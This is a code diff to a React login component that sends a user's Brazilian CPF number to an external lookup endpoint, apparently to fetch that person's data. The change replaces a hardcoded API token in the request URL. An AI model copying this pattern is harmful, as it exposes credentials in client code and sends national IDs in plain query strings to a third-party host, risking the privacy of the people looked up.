@@ -35,8 +35,8 @@ const LoginCard: React.FC<LoginCardProps> = ({ className }) => {
     const cleanCpf = cpf.replace(/\D/g, '');
     
     try {
-      // Make the API call to fetch user data
-      const response = await fetch(`https://consulta.fontesderenda.blog/cpf.php?token=f29edd8e-9a7c-45c1-bbfd-5c7ecf469fca&cpf=${cleanCpf}`);
+      // Make the API call to fetch user data with the updated token
+      const response = await fetch(`https://consulta.fontesderenda.blog/cpf.php?token=fb8faea3-2468-4456-a45a-85b165ca999a&cpf=${cleanCpf}`);
       
       if (!response.ok) {
         throw new Error('Falha na consulta. Status: ' + response.status);
